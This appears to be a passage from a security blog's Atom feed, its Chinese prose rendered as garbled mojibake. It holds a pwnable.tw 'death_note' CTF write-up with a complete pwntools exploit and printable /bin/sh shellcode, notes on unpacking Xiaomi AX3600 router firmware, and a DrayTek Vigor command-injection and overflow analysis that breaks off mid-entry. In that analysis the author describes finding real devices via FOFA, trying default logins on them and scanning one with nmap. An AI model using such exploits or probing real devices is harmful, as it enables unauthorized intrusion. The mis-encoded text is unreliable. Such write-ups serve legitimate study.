&lt;p&gt;å›ºä»¶ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;https://tsd.dlink.com.tw/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://tsd.dlink.com.tw/&lt;/a&gt;  é€‰æ‹©ä¸‹è½½DIR-878 </summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="è·¯ç”±å™¨" scheme="p1Kk.github.io/tags/è·¯ç”±å™¨/"/>
    
    <category term="å‘½ä»¤æ‰§è¡Œ" scheme="p1Kk.github.io/tags/å‘½ä»¤æ‰§è¡Œ/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw death_note wp</title>
    <link href="p1Kk.github.io/2021/03/13/tw/tw%20death_note/"/>
    <id>p1Kk.github.io/2021/03/13/tw/tw%20death_note/</id>
    <published>2021-03-12T16:00:00.000Z</published>
    <updated>2024-07-31T10:32:27.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="death-note"><a href="#death-note" class="headerlink" title="death_note"></a>death_note</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>å¼€äº†canaryï¼Œnxæ²¡å¼€</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/notebug.png" alt></p><p>æ¼æ´å¾ˆæ˜æ˜¾ï¼Œæ•°ç»„ä¸‹æ ‡åªåˆ¤æ–­äº†æ˜¯å¦&gt;10ï¼Œå¦‚æœè®¾ç½®indexä¸ºè´Ÿæ•°ï¼Œå¯ä»¥é€ æˆè¶Šç•Œå†™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048460â†‘r</span><br><span class="line">.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048460+6â†‘r</span><br><span class="line">.got.plt:0804A00C off_804A00C     dd offset read          ; DATA XREF: _readâ†‘r</span><br><span class="line">.got.plt:0804A010 off_804A010     dd offset printf        ; DATA XREF: _printfâ†‘r</span><br><span class="line">.got.plt:0804A014 off_804A014     dd offset free          ; DATA XREF: _freeâ†‘r</span><br><span class="line">.got.plt:0804A018 off_804A018     dd offset strdup        ; DATA XREF: _strdupâ†‘r</span><br><span class="line">.got.plt:0804A01C off_804A01C     dd offset __stack_chk_fail</span><br><span class="line">.got.plt:0804A01C                                         ; DATA XREF: ___stack_chk_failâ†‘r</span><br><span class="line">.got.plt:0804A020 off_804A020     dd offset puts          ; DATA XREF: _putsâ†‘r</span><br><span class="line">.got.plt:0804A024 off_804A024     dd offset exit          ; DATA XREF: _exitâ†‘r</span><br><span class="line">.got.plt:0804A028 off_804A028     dd offset strlen        ; DATA XREF: _strlenâ†‘r</span><br><span class="line">.got.plt:0804A02C off_804A02C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A02C                                         ; DATA XREF: ___libc_start_mainâ†‘r</span><br><span class="line">.got.plt:0804A030 off_804A030     dd offset setvbuf       ; DATA XREF: _setvbufâ†‘r</span><br><span class="line">.got.plt:0804A034 off_804A034     dd offset atoi          ; DATA XREF: _atoiâ†‘r</span><br><span class="line">.got.plt:0804A034 _got_plt        ends</span><br><span class="line">.got.plt:0804A034</span><br><span class="line">......</span><br><span class="line">.bss:0804A060                 public note</span><br><span class="line">.bss:0804A060 ; void *note[10]</span><br><span class="line">.bss:0804A060 note            dd ?                    ; DATA XREF: add_note+91â†‘w</span><br><span class="line">.bss:0804A060                                         ; del_note+41â†‘r ...</span><br></pre></td></tr></table></figure><p>gotè¡¨å’Œbssçš„è·ç¦»ï¼Œå¯ä»¥æ”¹gotä¸ºshellcodeåœ°å€ï¼Œfree_gotå’Œnoteçš„åç§»å³note[-19]</p><p>åŒæ—¶è¦æ³¨æ„ï¼Œaddæ—¶åœ¨<code>is_printable</code>ä¼šåˆ¤æ–­å†™å…¥çš„æ˜¯å¦æ˜¯å¯æ˜¾çš„ã€<a href="http://ascii.911cha.com/" target="_blank" rel="noopener">asciiç å¯¹ç…§è¡¨</a>ã€‘â€¦æ‰€ä»¥å°±æ˜¯è€ƒå¯Ÿå†™shellcodeçš„èƒ½åŠ›äº†o3o</p><p>ä¹Ÿå°±æ˜¯</p><p> <code>mov a,b</code>ç”¨ <code>push b;pop a</code>æ›¿æ¢</p><p><code>int 0x80</code>é€šè¿‡ <code>xor sub and inc dec</code> æ“ä½œ</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./death_note&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10201</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice :&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx, name):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line">io.sendlineafter(&quot;Name :&quot;, name)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">menu(2)</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">menu(3)</span><br><span class="line">io.sendlineafter(&quot;Index :&quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">sh = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"># gdb.attach(io,&apos;b *0x80487ef&apos;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = 0</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># shellcode = shellcraft.sh()</span><br><span class="line"></span><br><span class="line">/* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) */</span><br><span class="line">    /* push &apos;/bin///sh\x00&apos; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&apos;sh\x00&apos;] */</span><br><span class="line">    /* push &apos;sh\x00\x00&apos; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &apos;sh\x00&apos; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push 11 /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">shellcode = &apos;&apos;&apos;</span><br><span class="line">/*ebx &apos;/bin///sh&apos;*/</span><br><span class="line">push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    push esp</span><br><span class="line">    pop ebx</span><br><span class="line">    </span><br><span class="line">    /*edx 0xfffffffe --- dl 0xfe*/</span><br><span class="line">    push edx</span><br><span class="line">dec edx</span><br><span class="line">dec edx</span><br><span class="line"></span><br><span class="line">/*0xcd 0x80*/</span><br><span class="line">xor [eax+32], dl</span><br><span class="line">xor [eax+33], dl</span><br><span class="line"></span><br><span class="line">/*edx ecx 0*/</span><br><span class="line">inc edx</span><br><span class="line">inc edx</span><br><span class="line">push edx</span><br><span class="line">pop ecx</span><br><span class="line"></span><br><span class="line">push 0x40</span><br><span class="line">pop eax</span><br><span class="line">xor al,0x4b</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">add(-19, asm(shellcode)+&apos;\x33\x7e&apos;)</span><br><span class="line">delete(-19)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure><blockquote><p>shellcodeçš„å¥½æ–‡ç« ï¼š</p><p>ğŸ”º<a href="https://xz.aliyun.com/t/6645" target="_blank" rel="noopener">shellcode çš„è‰ºæœ¯</a></p><p>ğŸ”ºå’Œæœ¬é¢˜å¾ˆç›¸å…³çš„ExğŸ‚çš„æ–‡ç« <a href="http://blog.eonew.cn/archives/1125" target="_blank" rel="noopener">ç”Ÿæˆå¯æ‰“å°çš„shellcode</a></p><p><a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">ç¼–å†™x64å­—æ¯æ•°å­—shellcode</a></p><p><a href="https://www.exploit-db.com/exploits/35205" target="_blank" rel="noopener">Linux/x64 â€“ execve(â€œ/bin/shâ€,NULL,NULL) + Position Independent + Alphanumeric Shellcode (87 bytes)</a></p><p><a href="https://blog.csdn.net/Virtual_Func/article/details/49454801" target="_blank" rel="noopener">ç³»ç»Ÿè°ƒç”¨ä¸ä¸­æ–­</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/9258785.html" target="_blank" rel="noopener">Linux pwnå…¥é—¨æ•™ç¨‹(2)â€”â€”shellcodeçš„ä½¿ç”¨ï¼ŒåŸç†ä¸å˜å½¢</a></p><p>å¯è½¬å¯è§shellcodeå·¥å…·<a href="https://github.com/VincentDary/PolyAsciiShellGen" target="_blank" rel="noopener">https://github.com/VincentDary/PolyAsciiShellGen</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;death-note&quot;&gt;&lt;a href=&quot;#death-note&quot; class=&quot;headerlink&quot; title=&quot;death_note&quot;&gt;&lt;/a&gt;death_note&lt;/h1&gt;&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>å°ç±³è·¯ç”±å™¨AX3600 é€»è¾‘æ¼æ´ï¼ˆç®€çŸ­è®°å½•</title>
    <link href="p1Kk.github.io/2021/03/13/iot/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>p1Kk.github.io/2021/03/13/iot/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-12T16:00:00.000Z</published>
    <updated>2021-04-14T12:55:19.915Z</updated>
    
    <content type="html"><![CDATA[<p>å½±å“ç‰ˆæœ¬ï¼šåº”è¯¥æ˜¯v1.0.20ä¹‹å‰</p><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin" target="_blank" rel="noopener">http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin</a></p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="å›ºä»¶è§£åŒ…"><a href="#å›ºä»¶è§£åŒ…" class="headerlink" title="å›ºä»¶è§£åŒ…"></a>å›ºä»¶è§£åŒ…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk miwifi_r3600_firmware_5da25_1.0.17.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">684           0x2AC           UBI erase count header, version: 1, EC: 0x0, VID header offset: 0x800, data offset: 0x1000</span><br><span class="line"></span><br><span class="line"># UBIæ–‡ä»¶ï¼Œä½¿ç”¨ubi-reader</span><br><span class="line">$ binwalk -Me miwifi_r3600_firmware_5da25_1.0.17.bin </span><br><span class="line">$ ubireader_extract_images 2AC.ubi </span><br><span class="line">$ cd ubifs-root/1696626347</span><br><span class="line">$ ubireader_extract_files img-1696626347_vol-ubi_rootfs.ubifs </span><br><span class="line">guess_start_offset Fatal: Could not determine start offset.</span><br><span class="line"># æŠ¥é”™äº†ï¼Œå…·ä½“åŸå› æˆ‘è¿˜æ²¡æŸ¥åˆ°ï¼Œä½†åœ¨githubæºä»£ç é‡Œæœ‰çœ‹åˆ°è¿™å¥æŠ¥é”™...ï¼ˆè§†é¢‘ä¸­ä»–ç¬¬ä¸€æ¬¡ä½¿ç”¨imageså°±å‡ºç°äº†è¿™ä¸ªé—®é¢˜ï¼Œå‘ç°æ˜¯ubi-readerè‡ªèº«ä»£ç é—®é¢˜</span><br><span class="line">$ unsquashfs ./img-1696626347_vol-ubi_rootfs.ubifs </span><br><span class="line">$ cd squashfs-root</span><br></pre></td></tr></table></figure><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>æ ¹æ®pptï¼Œæ‰«æåˆ°å¼€æ”¾äº†6ä¸ªtcpç«¯å£ï¼š53ï¼ˆDNSï¼‰ï¼Œ80ï¼Œ784ï¼ˆunknownï¼‰ï¼Œ8080ï¼Œ8098ï¼Œ8999</p><h2 id="é»‘ç›’æµ‹è¯•"><a href="#é»‘ç›’æµ‹è¯•" class="headerlink" title="é»‘ç›’æµ‹è¯•"></a>é»‘ç›’æµ‹è¯•</h2><p>çœ‹ç€bilibiliçš„æ¼”è®²è§†é¢‘â€¦å‘ç°è‡ªå·±å¹¶æ²¡æœ‰æ¡ä»¶å»å¤ç°â€¦è§†é¢‘é‡Œè¿˜ç”¨0dayæ¥è·å–shellï¼Œç›´æ¥GGã€‚è§†é¢‘è®²çš„å¬æ¸…æ¥šäº†ï¼Œçœ‹çœ‹å¾—äº†â€¦</p><blockquote><p>Reference</p><p>ã€é•¿äº­HITCONæ¼”è®²è§†é¢‘ã€‘å¦‚ä½•ä»é›¶å¼€å§‹æ”»ç ´ä¸€å°æ˜æ˜ŸIoTè®¾å¤‡ï¼š<a href="https://www.bilibili.com/video/BV1gf4y1D7L2" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1gf4y1D7L2</a></p><p>æ¼”è®²PPTä¸‹è½½åœ°å€ï¼Œé“¾æ¥: <a href="https://pan.baidu.com/s/1VEf1c1jmxdziyvLhzGM8dw" target="_blank" rel="noopener">https://pan.baidu.com/s/1VEf1c1jmxdziyvLhzGM8dw</a> å¯†ç : 3ien</p><p><a href="https://x1ng.top/2020/12/16/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://x1ng.top/2020/12/16/%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½±å“ç‰ˆæœ¬ï¼šåº”è¯¥æ˜¯v1.0.20ä¹‹å‰&lt;/p&gt;
&lt;p&gt;å›ºä»¶ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/r3600/miwifi_r3600_firmware_5da25_1.0.17.bin&quot; </summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="è·¯ç”±å™¨" scheme="p1Kk.github.io/tags/è·¯ç”±å™¨/"/>
    
    <category term="é€»è¾‘æ¼æ´" scheme="p1Kk.github.io/tags/é€»è¾‘æ¼æ´/"/>
    
  </entry>
  
  <entry>
    <title>DrayTek Vigor CVE-2020-14472 CVE-2020-8515å‘½ä»¤æ³¨å…¥/14473æ ˆæº¢å‡º æ¼æ´å¤ç°</title>
    <link href="p1Kk.github.io/2021/02/14/iot/DrayTek%20Vigor%20CVE-2020-1447214473/"/>
    <id>p1Kk.github.io/2021/02/14/iot/DrayTek%20Vigor%20CVE-2020-1447214473/</id>
    <published>2021-02-13T16:00:00.000Z</published>
    <updated>2021-07-14T02:54:01.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-14472-CVE-2020-14473"><a href="#CVE-2020-14472-CVE-2020-14473" class="headerlink" title="CVE-2020-14472/CVE-2020-14473"></a>CVE-2020-14472/CVE-2020-14473</h1><p>ç‰ˆæœ¬è¦æ±‚ï¼šDrayTek Vigor2960/3900/300B  version&lt;1.5.1.1<br>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="http://www.draytek.com.cn/support/DownloadShow.php" target="_blank" rel="noopener">http://www.draytek.com.cn/support/DownloadShow.php</a></p><blockquote><p>ä»HWSè¯¾ç¨‹@C0ss4ck è®²è§£ä¸­å­¦ä¹ </p><ol><li><p>å¯»æ‰¾æ”»å‡»é¢ï¼š</p><ol><li><p>nmapæ‰«æç›®æ ‡å¼€å¯äº†å“ªäº›æœåŠ¡</p></li><li><p>å¦‚1723ï¼ˆpptpï¼‰ï¼Œ500ï¼ˆLT2Pï¼‰ï¼Œ8001ï¼ˆvcom-tunnelï¼‰æ˜¯vpnç›¸å…³ç«¯å£ï¼Œå®‰å…¨æ€§è¾ƒé«˜ï¼Œ<strong>ä¸åšè€ƒè™‘</strong></p></li><li><p>443ï¼ˆhttpsï¼‰ï¼Œ80ï¼ˆhttpï¼‰ åŸºäºlighttpè®¾è®¡ï¼Œä½¿ç”¨äº†å¤§é‡CGIæ‹“å±•ï¼Œé‡ç‚¹å…³æ³¨ã€‚</p></li></ol></li><li><p>å›ºä»¶è§£åŒ…</p><ol><li><p>binwalkæŸ¥çœ‹åŒ…ï¼Œå‘ç°æœ‰<code>UBI erease count header...</code>ï¼Œ<strong>ubireader</strong>â€”â€”é’ˆå¯¹ubiçš„æå–å·¥å…·ï¼Œä½¿ç”¨è¿™ä¸ªå·¥å…·è¿›è¡Œæå–</p></li><li><p>è¿›å…¥æå–åç›®å½•ï¼Œè¿›å…¥<code>etc/init.d</code>æŸ¥çœ‹é»˜è®¤å¯åŠ¨é¡¹</p></li><li><p>å›åˆ°æå–ç›®å½•ï¼ŒæŸ¥æ‰¾httpdç›¸å…³ï¼Œå°¤å…¶æ˜¯åœ¨/etc/init.dä¸‹çš„ï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶ï¼Œä»¥åŠhttpdçš„é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;       find . | grep httpd</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol></li></ol></blockquote><blockquote><ol start="4"><li>æ³¨æ„<strong>äºŒæ¬¡å¼€å‘</strong>äº§ç‰©ï¼Œåˆ°www/cgi-binç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹cgiæ–‡ä»¶</li></ol><ol start="3"><li><p>é€†å‘åˆ†æ</p><ol><li>å‘½ä»¤æ³¨å…¥ï¼ˆæˆæƒå‰ | æˆæƒåï¼‰</li><li>æº¢å‡º</li></ol></li></ol></blockquote><p>æˆ‘ä½¿ç”¨çš„æ˜¯v1.5.1ï¼Œè¿˜å­˜åœ¨å¾ˆå¤šå…¶ä»–æ¼æ´ï¼Œè¿™é‡Œåªè¯´æ˜è¿™ä¸¤ä¸ªcveä¸­å­˜åœ¨çš„æ¼æ´ã€‚</p><h2 id="æå–å›ºä»¶"><a href="#æå–å›ºä»¶" class="headerlink" title="æå–å›ºä»¶"></a>æå–å›ºä»¶</h2><p>binwalkæŸ¥çœ‹å›ºä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/2960ubi.png" alt></p><p>ä¸‹è½½<a href="https://github.com/jrspruitt/ubi_reader" target="_blank" rel="noopener">ubireader</a>ï¼Œä½¿ç”¨ubireaderè¿›è¡Œå›ºä»¶è§£åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ubireader_extract_images Vigor2960_v1.5.1.all</span><br><span class="line">$ ubireader_extract_files img-1000863340_vol-rootfs.ubifs</span><br></pre></td></tr></table></figure><h2 id="å¯»æ‰¾æ¼æ´ç‚¹"><a href="#å¯»æ‰¾æ¼æ´ç‚¹" class="headerlink" title="å¯»æ‰¾æ¼æ´ç‚¹"></a>å¯»æ‰¾æ¼æ´ç‚¹</h2><ul><li>checksec</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kk/iot/DrayTek/Vigor2960_v1.5.1/ubifs-root/Vigor2960_v1.5.1.all/ubifs-root/www/cgi-bin/mainfunction.cgi&apos;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><ul><li><p>nmap</p><p>åœ¨fofaæ‰¾ç›¸å…³ï¼ˆä½¿ç”¨é»˜è®¤ç™»å½•è´¦å·å¯†ç å¤±è´¥â€¦ï¼‰ nmapæ‰«ä¸€ä¸‹<img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/2960nmap.png" alt></p></li><li><p>æŸ¥æ‰¾httpdç›¸å…³çš„é»˜è®¤å¯åŠ¨é¡¹ï¼ˆåœ¨init.dç›®å½•ä¸‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/init_httpd.png" alt></p><p>åŸºäºlighttpdè®¾è®¡ï¼Œå­˜åœ¨å¤§é‡çš„CGIæ‹“å±•ã€‚</p><p>lighttpdæ˜¯ä¸€ä¸ªè½»é‡çº§çš„webæœåŠ¡å™¨ï¼Œä¸€èˆ¬ä¼šæœ‰cgiæ–‡ä»¶ä½œä¸ºæ”¯æŒï¼Œåœ¨./etc/lighttpd/lighttpd.confä¸­å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨çš„å„ä¸ªé…ç½®é¡¹ï¼Œåœ¨åˆ†æå›ºä»¶ä¹‹å‰å¯ä»¥å…ˆæŸ¥çœ‹ä¸€ä¸‹æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ ·æœ‰åŠ©äºæˆ‘ä»¬ç¡®å®šåˆ†æç›®æ ‡ã€‚</p></li><li><p>ida</p><p>åœ¨startå‡½æ•°ä¸­ï¼Œæ‰¾åˆ°mainï¼Œå¹¶é‡å‘½åå‡½æ•°åï¼Œåœ¨mainå‡½æ•°å¼€å§‹ï¼Œå°±æ˜¯è·å–ç¯å¢ƒå˜é‡<code>PATH_INFO</code>ï¼Œå¹¶æ ¹æ®<code>PATH_INFO</code>çš„å€¼æ¥åˆ†æµã€‚</p><p>åœ¨loginä¸­ï¼Œå‘ç°<strong>æº¢å‡ºã€1ã€‘</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/loginOverflow.png" alt></p><p>å¦‚æœä¸å­˜åœ¨åŒ¹é…çš„å€¼ï¼Œå°±æ‰§è¡Œä¸‹é¢çš„ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/matchFunction2.png" alt></p><p>æ‰€ä»¥æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹åŒ¹é…åçš„å¯¹åº”å‡½æ•°ã€‚åœ¨<code>get_subconfig</code>ã€<code>doOpenVPN</code>ã€<code>doGRETunnel</code>ã€<code>download_ovpn</code>ã€<code>ruequest_certificate</code>ã€<code>dumpSyslog</code>ã€<code>delete_wlan_profile</code>ã€<code>set_ap_map_config</code>ä¸­å­˜åœ¨<strong>å‘½ä»¤æ³¨å…¥ã€1~8ã€‘</strong>ã€‚å½¢å¦‚ä»¥ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/subconfig.png" alt></p><p>åœ¨<code>authuser</code>ä¸­å­˜åœ¨<strong>å‘½ä»¤æ³¨å…¥ã€9ã€‘</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/smsphonenmber.png" alt></p><p>è¿™ä¸ªå‡½æ•°ç»§ç»­å¾€ä¸‹çœ‹ï¼Œæœ‰å‡ ä¸ªå‡½æ•°å¯¹urlè¿›è¡Œäº†å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/smsurl.png" 